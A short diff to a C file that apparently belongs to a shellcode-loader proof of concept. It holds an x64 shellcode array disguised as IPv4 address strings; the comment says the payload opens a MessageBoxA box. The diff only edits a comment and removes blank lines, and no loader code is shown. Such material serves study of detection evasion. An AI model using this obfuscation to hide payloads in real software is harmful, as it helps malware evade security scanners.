@@ -9,7 +9,7 @@
 
 #define PAYLOAD_SIZE 256 // to Ajust.
 
-// Tableau d'IP obfusquées
+//Obfuscated payload => MessageBoxA payload.
 const char* obfuscated_shellcode_x64[] = {
     "72.131.236.40", "72.131.228.240", "72.141.21.102", "0.0.0.72",
     "141.13.82.0", "0.0.232.158", "0.0.0.76", "139.248.72.141",
@@ -40,8 +40,6 @@ const char* obfuscated_shellcode_x64[] = {
     "204.72.139.214", "233.20.255.255", "255.72.3.195", "72.131.196.40",
     "195.0.0.0"
 };
-
-
 
 /**
  * ENTRY POINT.
